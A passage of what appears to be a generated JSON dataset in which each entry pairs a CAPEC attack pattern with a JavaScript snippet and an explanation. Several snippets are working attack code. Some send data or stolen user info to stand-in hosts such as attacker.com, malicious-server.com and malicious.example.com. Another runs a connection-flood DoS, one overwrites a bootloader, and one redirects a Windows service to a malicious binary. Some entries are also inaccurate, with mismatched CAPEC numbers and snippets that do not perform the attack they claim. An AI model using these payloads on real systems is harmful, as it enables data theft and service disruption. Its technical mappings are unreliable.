        "code_snippet": "function authenticate(user, password) {\n  if (user === 'admin' && password === 'password123') {\n    // Malicious code insertion\n    console.log('Access granted to admin.');\n    // Embedded malicious code\n    eval('while(true){}'); // Infinite loop to degrade system performance\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Simulate an authentication attempt\nauthenticate('admin', 'password123');",
        "description": "This JavaScript code snippet demonstrates a simple authentication function that contains embedded malicious code. The function `authenticate` checks if the provided username and password match hardcoded values ('admin' and 'password123'). If the credentials are correct, it logs 'Access granted to admin.' and then executes an infinite loop using `eval('while(true){}')`, which is a form of embedded malicious code designed to degrade system performance. This represents the main idea of CAPEC-457, where malicious logic is inserted into product hardware (or software in this case). The related CWEs provide context for the vulnerabilities: CWE-506 (Embedded Malicious Code) and CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy)."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "const memory = new ArrayBuffer(1024); // 1KB of memory\nconst protectedRegion = new DataView(memory, 0, 512); // First 512 bytes are protected\nconst mirroredRegion = new DataView(memory, 512, 512); // Next 512 bytes mirror the first 512 bytes\n\n// Simulate improper access control\nfunction writeToProtectedRegion(offset, value) {\n  if (offset < 512) {\n    protectedRegion.setUint8(offset, value);\n  } else {\n    console.log('Access denied: Out of protected region bounds');\n  }\n}\n\nfunction writeToMirroredRegion(offset, value) {\n  mirroredRegion.setUint8(offset, value); // No access control check\n}\n\n// Attacker writes to mirrored region, bypassing protection\nwriteToMirroredRegion(0, 0xFF); // This should be blocked but isn't\nconsole.log(protectedRegion.getUint8(0)); // Outputs: 255, showing the protected region was modified",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Infected Memory' attack pattern. It creates a 1KB memory buffer with the first 512 bytes designated as a protected region and the next 512 bytes as a mirrored region. The `writeToProtectedRegion` function enforces access control, preventing writes outside the protected region. However, the `writeToMirroredRegion` function lacks such checks, allowing an attacker to write to the mirrored region and indirectly modify the protected region. This illustrates vulnerabilities like CWE-1257 (Improper Access Control Applied to Mirrored or Aliased Memory Regions) and CWE-1312 (Missing Protection for Mirrored Regions in On-Chip Fabric Firewall), where improper handling of memory regions can lead to security breaches."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Simulate malicious code embedded in a USB device\nfunction infectSystem() {\n  // CWE-506: Embedded Malicious Code\n  fs.writeFile('/tmp/malicious.txt', 'This is a malicious file', (err) => {\n    if (err) throw err;\n    console.log('Malicious file created');\n  });\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const data = 'Sensitive data to exfiltrate';\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/exfiltrate',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'text/plain',\n      'Content-Length': data.length\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      console.log(`BODY: ${chunk}`);\n    });\n    res.on('end', () => {\n      console.log('No more data in response.');\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  // Write data to request body\n  req.write(data);\n  req.end();\n}\n\n// Simulate USB device being plugged in\ninfectSystem();",
        "description": "This JavaScript code snippet simulates a USB memory attack by embedding malicious code that creates a file on the system (CWE-506: Embedded Malicious Code) and exfiltrates sensitive data in cleartext (CWE-319: Cleartext Transmission of Sensitive Information) to a remote server. The `infectSystem` function represents the malicious payload that could be executed when a compromised USB device is plugged into a system. The code writes a malicious file to the system and sends sensitive data to a remote server over an unencrypted HTTP connection, demonstrating the potential risks associated with USB memory attacks as described in the CAPEC."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "const fs = require('fs');\n\n// CWE-1282: Storing assumed-immutable data in writable memory\nconst bootloaderPath = '/path/to/bootloader';\n\n// CWE-506: Embedded malicious code\nconst maliciousCode = `\n  // Malicious logic\n  console.log('Malicious code executed');\n`;\n\n// Function to flash the bootloader with malicious code\nfunction flashBootloader() {\n  try {\n    // CWE-1274: Improper access control for volatile memory containing boot code\n    fs.writeFileSync(bootloaderPath, maliciousCode, { flag: 'w' });\n    console.log('Bootloader flashed with malicious code');\n  } catch (err) {\n    console.error('Failed to flash bootloader:', err);\n  }\n}\n\n// Simulate the attack\nflashBootloader();",
        "description": "This JavaScript code snippet demonstrates a flash memory attack by embedding malicious logic into a bootloader. The code represents the main idea of the CAPEC by showing how an adversary might insert malicious code into a product's bootloader, which is assumed to be immutable but is stored in writable memory (CWE-1282). The function `flashBootloader` writes the malicious code to the bootloader path, simulating the process of flashing the on-board memory with compromised code. This also highlights the lack of proper access control for volatile memory containing boot code (CWE-1274) and the presence of embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// Simulate generating a CSR with a weak hash algorithm (MD5)\nfunction generateCSR(data) {\n  const hash = crypto.createHash('md5');\n  hash.update(data);\n  return hash.digest('hex');\n}\n\n// Simulate signing the CSR by a trusted CA\nfunction signCSR(csr) {\n  // In a real scenario, this would involve the CA's private key\n  return `signed(${csr})`;\n}\n\n// Simulate creating a rogue certificate with a hash collision\nfunction createRogueCertificate(originalData, rogueData) {\n  const originalCSR = generateCSR(originalData);\n  const rogueCSR = generateCSR(rogueData);\n\n  if (originalCSR === rogueCSR) {\n    const signedCSR = signCSR(originalCSR);\n    console.log('Original CSR:', signedCSR);\n    console.log('Rogue CSR:', signedCSR);\n  } else {\n    console.log('No collision found.');\n  }\n}\n\n// Example data\nconst originalData = 'Original Certificate Data';\nconst rogueData = 'Rogue Certificate Data with Collision';\n\ncreateRogueCertificate(originalData, rogueData);",
        "description": "This JavaScript code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5). The `generateCSR` function simulates generating a Certificate Signing Request (CSR) using MD5, which is known for its weak collision resistance. The `signCSR` function simulates the signing of the CSR by a trusted Certificate Authority (CA). The `createRogueCertificate` function attempts to create a rogue certificate by generating two different CSRs (one original and one rogue) that hash to the same value. If a collision is found, both the original and rogue CSRs appear to be signed by the CA, demonstrating the vulnerability. This code embodies the main idea of CAPEC- Creating a Rogue Certification Authority Certificate and highlights related weaknesses such as the use of a broken cryptographic algorithm (CWE-327) and improper certificate validation (CWE-295)."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = new URL(req.url, `http://${req.headers.host}`);\n  const params = url.searchParams;\n\n  // Vulnerable to HTTP Parameter Pollution\n  const user = params.get('user');\n  const role = params.get('role');\n\n  // Simulate sensitive operation based on parameters\n  if (user && role) {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`User: ${user}, Role: ${role}`);\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Missing parameters');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server processes incoming GET requests and extracts query parameters 'user' and 'role' from the URL. The code is vulnerable to HTTP Parameter Pollution (HPP) because it does not handle duplicate parameters correctly. An attacker could inject additional 'user' or 'role' parameters to manipulate the application's behavior. For example, a request to 'http://127.0.0.1:8080/?user=admin&role=guest&role=admin' could lead to unexpected behavior. This vulnerability is related to CWE-235 (Improper Handling of Extra Parameters) and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak hash function (MD5) used for generating signature\nfunction generateSignature(params, secret) {\n  const hash = crypto.createHash('md5');\n  hash.update(params + secret);\n  return hash.digest('hex');\n}\n\n// Simulated web service request\nfunction webServiceRequest(params, signature) {\n  const secret = 'supersecret'; // Secret token known only to the server\n  const expectedSignature = generateSignature(params, secret);\n  if (signature === expectedSignature) {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Adversary's attempt to forge a signature using hash extension attack\nconst maliciousParams = 'user=attacker&role=admin';\nconst forgedSignature = generateSignature(maliciousParams, ''); // Secret is unknown\nwebServiceRequest(maliciousParams, forgedSignature);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can exploit a weak hash function (MD5) to forge a signature and bypass authentication. The `generateSignature` function uses MD5 to create a hash of the parameters concatenated with a secret token. The `webServiceRequest` function simulates a web service that authenticates requests by comparing the provided signature with the expected signature. An adversary can exploit the hash function's extension weakness by generating a signature for malicious parameters without knowing the secret token. This represents the CAPEC's main idea of leveraging hash function extension weaknesses to forge signatures and bypass authentication, highlighting related CWEs such as the use of weak hash functions and weak authentication mechanisms."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "const urls = ['https://example.com/resource1', 'https://example.com/resource2'];\n\nfunction measureTiming(url) {\n  return new Promise((resolve) => {\n    const start = performance.now();\n    fetch(url, { mode: 'no-cors' }).then(() => {\n      const end = performance.now();\n      resolve(end - start);\n    }).catch(() => {\n      const end = performance.now();\n      resolve(end - start);\n    });\n  });\n}\n\nasync function timeRequests() {\n  for (const url of urls) {\n    const time = await measureTiming(url);\n    console.log(`Time for ${url}: ${time}ms`);\n  }\n}\n\ntimeRequests();",
        "description": "This JavaScript code snippet demonstrates a Cross-Domain Search Timing attack. The code initiates cross-domain HTTP GET requests to a list of URLs and measures the time taken for each request to complete. The 'fetch' function is used with 'no-cors' mode to bypass the same-origin policy, which prevents reading the response but allows timing the request. The 'performance.now()' function is used to measure the time before and after the request. The timing information is then logged to the console. This timing data can potentially reveal information about the server's state or the presence of certain resources, embodying the main idea of CAPEC-233. The related CWEs provide additional context, such as the use of covert timing channels (CWE-385) and observable timing discrepancies (CWE-208)."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction decrypt(ciphertext, key) {\n  const decipher = crypto.createDecipheriv('aes-256-cbc', key, ciphertext.slice(0, 16));\n  let decrypted = Buffer.concat([decipher.update(ciphertext.slice(16)), decipher.final()]);\n  try {\n    // Check padding\n    const paddingLength = decrypted[decrypted.length - 1];\n    if (paddingLength > 16) throw new Error('Invalid padding');\n    for (let i = 1; i <= paddingLength; i++) {\n      if (decrypted[decrypted.length - i] !== paddingLength) throw new Error('Invalid padding');\n    }\n    decrypted = decrypted.slice(0, -paddingLength);\n  } catch (e) {\n    // Leaking padding error information\n    console.error('Padding error:', e.message);\n    return null;\n  }\n  return decrypted;\n}\n\n// Example usage\nconst key = crypto.randomBytes(32);\nconst iv = crypto.randomBytes(16);\nconst cipher = crypto.createCipheriv('aes-256-cbc', key, iv);\nlet ciphertext = Buffer.concat([iv, cipher.update('Sensitive data'), cipher.final()]);\n\nconsole.log(decrypt(ciphertext, key));",
        "description": "This JavaScript code snippet demonstrates a vulnerable decryption function that is susceptible to a Padding Oracle Crypto Attack. The function `decrypt` takes a ciphertext and a key, and attempts to decrypt the ciphertext using AES-256-CBC. After decryption, it checks the padding of the decrypted data. If the padding is invalid, it throws an error and logs a padding error message. This leakage of padding error information can be exploited by an attacker to decrypt the ciphertext without knowing the key, as described in the CAPEC. The related CWEs are represented by the generation of error messages containing sensitive information (CWE-209), reliance on encryption without integrity checking (CWE-649), and improper validation of integrity check values (CWE-354)."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "function setEvercookie(name, value) {\n    var storage = [localStorage, sessionStorage, document.cookie];\n    var flashLSO = new FlashLSO(); // Hypothetical Flash Local Shared Object API\n    var userData = new UserData(); // Hypothetical UserData API\n\n    function setCookie() {\n        document.cookie = name + '=' + value + '; path=/';\n    }\n\n    function setLocalStorage() {\n        localStorage.setItem(name, value);\n    }\n\n    function setSessionStorage() {\n        sessionStorage.setItem(name, value);\n    }\n\n    function setFlashLSO() {\n        flashLSO.setItem(name, value);\n    }\n\n    function setUserData() {\n        userData.setItem(name, value);\n    }\n\n    function replicateCookie() {\n        setCookie();\n        setLocalStorage();\n        setSessionStorage();\n        setFlashLSO();\n        setUserData();\n    }\n\n    replicateCookie();\n\n    window.addEventListener('storage', function() {\n        replicateCookie();\n    });\n}\n\nsetEvercookie('userSession', 'sensitiveData');",
        "description": "This JavaScript code snippet demonstrates the concept of an 'evercookie,' a highly persistent cookie that is stored in multiple locations on the user's machine. The `setEvercookie` function sets a cookie in various storage mechanisms, including localStorage, sessionStorage, document.cookie, and hypothetical Flash Local Shared Objects (LSO) and UserData APIs. The `replicateCookie` function ensures that the cookie is replicated across all these storage locations. An event listener on the 'storage' event ensures that if the cookie is deleted from one location, it is immediately replicated back from the other locations. This makes the cookie extremely difficult to remove completely. The code embodies the CAPEC idea of creating a persistent cookie that can resurrect itself, and it highlights related CWEs such as the use of persistent cookies containing sensitive information (CWE-539) and the cleartext storage of sensitive information in a cookie (CWE-315)."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "const http = require('http');\n\nconst proxy = http.createServer((req, res) => {\n  const options = {\n    hostname: 'target-server.com',\n    port: 80,\n    path: req.url,\n    method: req.method,\n    headers: req.headers\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res, { end: true });\n  });\n\n  req.pipe(proxyReq, { end: true });\n\n  proxyReq.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n    res.writeHead(500);\n    res.end('Internal Server Error');\n  });\n});\n\nproxy.listen(8080, () => {\n  console.log('Proxy server is running on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP proxy server using Node.js. The proxy server listens on port 8080 and forwards incoming client requests to a target server ('target-server.com'). The proxy server also forwards the responses from the target server back to the client. This setup embodies the main idea of the CAPEC 'Transparent Proxy Abuse' by acting as an intermediary between the client and the target server in a manner that is transparent to the client.\n\nThe code also touches on several related CWEs:\n- CWE-441: The proxy server forwards requests without preserving the original source, potentially leading to 'Confused Deputy' issues.\n- CWE-444: The proxy server does not handle malformed HTTP requests, which could lead to 'HTTP Request/Response Smuggling'.\n- CWE-602: The proxy server relies on the client to enforce security, which is a form of 'Client-Side Enforcement of Server-Side Security'.\n- CWE-212: The proxy server does not remove sensitive information from requests or responses, leading to 'Improper Removal of Sensitive Information'.\n- CWE-941: The proxy server could incorrectly specify the destination in the communication channel, leading to 'Incorrectly Specified Destination'."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "const targetUrl = 'http://example.com/api/data';\n\nfetch(targetUrl)\n  .then(response => response.json())\n  .then(data => {\n    console.log('Data from target:', data);\n    // Simulate an attacker intercepting and modifying the response\n    const modifiedData = { ...data, malicious: 'injected' };\n    console.log('Modified Data:', modifiedData);\n  })\n  .catch(error => console.error('Error:', error));",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can intercept and modify the response from a non-TLS protected API endpoint, embodying the main idea of CAPEC-94. The code fetches data from a target URL using the Fetch API. An attacker on a public Wi-Fi network could intercept this request and modify the response data before it reaches the client. This is possible due to the lack of TLS protection (CWE-300) and improper restriction of communication channels (CWE-923). The code also highlights the risk of client-side enforcement of server-side security (CWE-602) and permissive cross-domain policies (CWE-942) by showing how easily the data can be tampered with."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "const socialNetworkAPI = 'https://socialnetwork.com/api/userinfo';\n\nfunction stealUserInfo() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('GET', socialNetworkAPI, true);\n  xhr.onreadystatechange = function() {\n    if (xhr.readyState === 4 && xhr.status === 200) {\n      const userInfo = JSON.parse(xhr.responseText);\n      sendToAttacker(userInfo);\n    }\n  };\n  xhr.send();\n}\n\nfunction sendToAttacker(data) {\n  const attackerServer = 'https://attacker.com/collect';\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', attackerServer, true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify(data));\n}\n\n// Trigger the function to steal user info\nstealUserInfo();",
        "description": "This JavaScript code snippet demonstrates a Cross Site Identification attack. The `stealUserInfo` function sends a GET request to a social networking site's API endpoint to retrieve user information. If the user is logged into the social networking site, the browser will include the user's session cookies in the request, allowing the attacker to harvest the user's private information. The retrieved information is then sent to the attacker's server using the `sendToAttacker` function. This code embodies the main idea of CAPEC-111 by exploiting an active session to gather identifying information. It also touches on related CWEs such as CSRF (CWE-352) by making unauthorized requests, and Exposure of Private Personal Information (CWE-359) by sending sensitive data to an unauthorized actor."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "const targetDomain = 'https://victim.com';\nconst cssUrl = `${targetDomain}/styles.css?cookie=${document.cookie}`;\n\nconst link = document.createElement('link');\nlink.rel = 'stylesheet';\nlink.href = cssUrl;\ndocument.head.appendChild(link);",
        "description": "This JavaScript code snippet demonstrates a Generic Cross-Browser Cross-Domain Theft attack. The attacker creates a link element that loads a CSS file from a target domain (victim.com) and appends the user's cookies to the URL as a query parameter. When the browser requests the CSS file, it sends the cookies to the target domain. This exploits the fact that browsers send cookies with cross-domain CSS requests and that CSS parsers ignore non-CSS data, allowing the attacker to steal cookies. The code leverages CWE-707 (Improper Neutralization) by not properly sanitizing the URL, CWE-149 (Improper Neutralization of Quoting Syntax) by potentially mishandling quotes in the URL, CWE-177 (Improper Handling of URL Encoding) by not encoding the cookie value, CWE-838 (Inappropriate Encoding for Output Context) by not ensuring the correct encoding, and CWE-79 (Cross-site Scripting) by injecting user-controllable input into the URL."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  }\n};\n\nfunction flood() {\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  });\n\n  req.on('error', (e) => {});\n\n  // Do not end the request to keep the session alive\n  // req.end();\n}\n\nfor (let i = 0; i < 1000; i++) {\n  flood();\n}",
        "description": "This JavaScript code snippet demonstrates an HTTP DoS attack by creating multiple HTTP requests to a target server without closing the connections. The 'flood' function initiates an HTTP GET request to 'target-server.com' and intentionally does not call 'req.end()', keeping the HTTP session alive indefinitely. By running this function in a loop, the code attempts to exhaust the server's resources by maintaining numerous open connections. This attack exploits the server's resource allocation without limits (CWE-770) and insufficient resource pool (CWE-410), leading to a denial of service."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.use(express.json());\n\napp.post('/execute', (req, res) => {\n  const userInput = req.body.query;\n  connection.query(userInput, (error, results) => {\n    if (error) {\n      return res.status(500).send('Error executing query');\n    }\n    res.send(results);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that connects to a MySQL database. It includes an endpoint '/execute' that takes a SQL query from the request body and executes it directly on the database. This code is vulnerable to SQL Injection (CWE-89) because it directly uses user input in the SQL query without any sanitization or parameterization. An attacker could exploit this to execute arbitrary SQL commands, potentially gaining access to the file system, operating system, or other machines on the network (CAPEC-118). The database connection is also established with root privileges, which is an example of Execution with Unnecessary Privileges (CWE-250), amplifying the potential damage of an attack."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLibrary(libName) {\n  const searchPaths = [\n    path.join(__dirname, libName),\n    path.join('/usr/local/lib', libName),\n    path.join('/usr/lib', libName)\n  ];\n\n  for (const searchPath of searchPaths) {\n    if (fs.existsSync(searchPath)) {\n      return require(searchPath);\n    }\n  }\n\n  throw new Error('Library not found');\n}\n\n// Example usage\ntry {\n  const myLib = loadLibrary('myLibrary.js');\n  myLib.doSomething();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of library loading that embodies the concept of 'Search Order Hijacking' (CAPEC-471). The `loadLibrary` function searches for a library in a predefined set of directories. The search order starts with the current directory (`__dirname`), followed by system directories. An attacker could exploit this by placing a malicious library in the current directory, which would be loaded preferentially over the legitimate library in the system directories. This vulnerability is related to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the search path includes directories that could be controlled by an attacker."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "function getBrowserFingerprint() {\n    var fingerprint = '';\n    fingerprint += 'Browser: ' + navigator.userAgent + '\\n';\n    fingerprint += 'Platform: ' + navigator.platform + '\\n';\n    fingerprint += 'Cookies Enabled: ' + navigator.cookieEnabled + '\\n';\n    fingerprint += 'Language: ' + navigator.language + '\\n';\n    fingerprint += 'Screen Resolution: ' + screen.width + 'x' + screen.height + '\\n';\n    return fingerprint;\n}\n\nfunction sendFingerprint() {\n    var xhr = new XMLHttpRequest();\n    var fingerprint = getBrowserFingerprint();\n    xhr.open('GET', 'http://malicious.example.com/collect?data=' + encodeURIComponent(fingerprint), true);\n    xhr.send();\n}\n\nsendFingerprint();",
        "description": "This JavaScript code snippet demonstrates a basic form of browser fingerprinting, which is the main idea of the CAPEC. The `getBrowserFingerprint` function collects various pieces of information about the user's browser and environment, such as the user agent, platform, cookie settings, language, and screen resolution. This information is then concatenated into a single string. The `sendFingerprint` function sends this collected data to a remote server using an HTTP GET request, which includes the fingerprint data in the query string. This approach leverages CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by sending potentially sensitive information without user consent. It also uses CWE-598 (Use of GET Request Method With Sensitive Query Strings) by including the fingerprint data in the URL, which can be intercepted or logged. The code snippet represents how an attacker can gather detailed information about a user's browser to tailor subsequent attacks more effectively."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA1'); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  verifier.update(message);\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction receiveMessage(message, signature, publicKey) {\n  if (!verifySignature(message, signature, publicKey)) { // CWE-290: Authentication Bypass by Spoofing\n    throw new Error('Invalid signature');\n  }\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n  console.log('Message received:', message);\n}\n\n// Simulated message reception\nconst message = 'Important message';\nconst signature = 'fake_signature'; // CWE-20: Improper Input Validation\nconst publicKey = 'fake_public_key'; // CWE-941: Incorrectly Specified Destination in a Communication Channel\n\ntry {\n  receiveMessage(message, signature, publicKey);\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a signature, leading to a Signature Spoof attack. The `verifySignature` function uses the SHA1 algorithm, which is considered broken and risky (CWE-327). The `receiveMessage` function attempts to verify the signature of a received message, but due to the use of a weak cryptographic algorithm and improper input validation (CWE-20), an attacker can bypass authentication (CWE-290) by providing a fake signature and public key. Additionally, the code does not ensure message integrity during transmission (CWE-924) and incorrectly specifies the destination in the communication channel (CWE-941). This code highlights the vulnerabilities that can lead to a Signature Spoof attack."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate insecure storage of private key\nlet privateKey = '-----BEGIN PRIVATE KEY-----\\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\\n-----END PRIVATE KEY-----';\n\n// Function to sign a message\nfunction signMessage(message) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(message);\n  sign.end();\n  const signature = sign.sign(privateKey, 'hex');\n  return signature;\n}\n\n// Simulate an attacker stealing the private key\nlet stolenPrivateKey = privateKey;\n\n// Attacker uses the stolen key to sign a malicious message\nlet maliciousMessage = 'Transfer $1000 to attacker';\nlet forgedSignature = signMessage(maliciousMessage);\n\nconsole.log('Malicious Message:', maliciousMessage);\nconsole.log('Forged Signature:', forgedSignature);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker steals a private signature key and uses it to forge a signature on a malicious message. The private key is stored insecurely, making it susceptible to theft (CWE-522). The attacker then uses the stolen key to sign a message, bypassing authentication (CWE-290) and assuming the identity of the original signer. This embodies the main idea of CAPEC- Signature Spoofing by Key Theft, where the attacker misleads the victim into performing actions that benefit the attacker."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(data);\n  verifier.end();\n  // Improper verification: does not check the result of verify()\n  verifier.verify(publicKey, signature, 'hex');\n  return true; // Always returns true, regardless of actual verification result\n}\n\nconst data = 'Important data';\nconst signature = 'fakeSignature';\nconst publicKey = 'fakePublicKey';\n\nif (verifySignature(data, signature, publicKey)) {\n  console.log('Signature is valid');\n} else {\n  console.log('Signature is invalid');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Signature Spoofing by Improper Validation' (CAPEC). The function `verifySignature` is intended to verify a cryptographic signature using a public key. However, it contains a critical flaw: it does not properly check the result of the `verifier.verify` method. Instead, it always returns `true`, indicating that any signature is considered valid. This represents CWE-347 (Improper Verification of Cryptographic Signature) and CWE-290 (Authentication Bypass by Spoofing), as the improper validation allows an attacker to bypass authentication by presenting a spoofed signature."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(message, signature, publicKey) {\n  const verifier = crypto.createVerify('SHA256');\n  verifier.update(message);\n  verifier.end();\n  return verifier.verify(publicKey, signature, 'hex');\n}\n\nfunction spoofSignature(message, fakeSignature, fakePublicKey) {\n  if (verifySignature(message, fakeSignature, fakePublicKey)) {\n    console.log('Signature verified. Executing sensitive operation...');\n    // Sensitive operation that should only be executed with a valid signature\n  } else {\n    console.log('Signature verification failed.');\n  }\n}\n\nconst message = 'Important message';\nconst fakeSignature = 'abcdef1234567890'; // Fake signature\nconst fakePublicKey = '-----BEGIN PUBLIC KEY-----\\n...\\n-----END PUBLIC KEY-----'; // Fake public key\n\nspoofSignature(message, fakeSignature, fakePublicKey);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a cryptographic signature to misrepresent the signer's identity. The `verifySignature` function is intended to verify the authenticity of a message using a provided signature and public key. However, the `spoofSignature` function uses a fake signature and a fake public key to trick the verification process. If the verification succeeds, a sensitive operation is executed, representing a potential security breach. This example embodies the CAPEC of 'Signature Spoofing by Misrepresentation' and highlights related CWEs such as 'Improper Verification of Cryptographic Signature' (CWE-347) and 'Authentication Bypass by Spoofing' (CWE-290)."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "function processData(data) {\n  if (data.isSigned) {\n    // Verify the signature\n    if (!verifySignature(data)) {\n      throw new Error('Invalid signature');\n    }\n  }\n  // Process the data regardless of signature verification\n  processContent(data.content);\n}\n\nfunction verifySignature(data) {\n  // Simulate signature verification\n  return data.signature === 'valid_signature';\n}\n\nfunction processContent(content) {\n  console.log('Processing content:', content);\n}\n\n// Example usage\nconst signedData = { isSigned: true, signature: 'valid_signature', content: 'Sensitive Data' };\nconst unsignedData = { isSigned: false, content: 'Non-sensitive Data' };\n\nprocessData(signedData); // Should process after verification\nprocessData(unsignedData); // Should process without verification",
        "description": "This JavaScript code snippet demonstrates a vulnerability where both signed and unsigned data are processed without proper distinction. The `processData` function checks if the data is signed and attempts to verify the signature. However, it processes the content regardless of whether the signature is valid or if the data is unsigned. This embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' by allowing unsigned data to be processed as though it were signed. The related CWEs are represented as follows: CWE-347 (Improper Verification of Cryptographic Signature) is shown by the simplistic and insecure signature verification, CWE-693 (Protection Mechanism Failure) is demonstrated by the lack of proper handling for unsigned data, and CWE-196 (Unsigned to Signed Conversion Error) is implied by the potential mishandling of data types in a more complex scenario."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// CWE-284: Improper Access Control\n// CWE-15: External Control of System or Configuration Setting\nconst serviceConfigPath = 'C:\\Windows\\System32\\config\\serviceConfig.json';\n\n// Read the current service configuration\nfs.readFile(serviceConfigPath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading service configuration:', err);\n    return;\n  }\n\n  let config;\n  try {\n    config = JSON.parse(data);\n  } catch (parseErr) {\n    console.error('Error parsing service configuration:', parseErr);\n    return;\n  }\n\n  // CWE-15: Modify the service configuration to point to a malicious binary\n  config.servicePath = 'C:\\malicious\\malicious.exe';\n\n  // Write the modified configuration back to the file\n  fs.writeFile(serviceConfigPath, JSON.stringify(config), 'utf8', (writeErr) => {\n    if (writeErr) {\n      console.error('Error writing modified service configuration:', writeErr);\n      return;\n    }\n\n    console.log('Service configuration modified successfully.');\n\n    // CWE-284: Improper Access Control\n    // CWE-520: .NET Misconfiguration: Use of Impersonation\n    // Execute the modified service configuration\n    exec('sc start MyService', 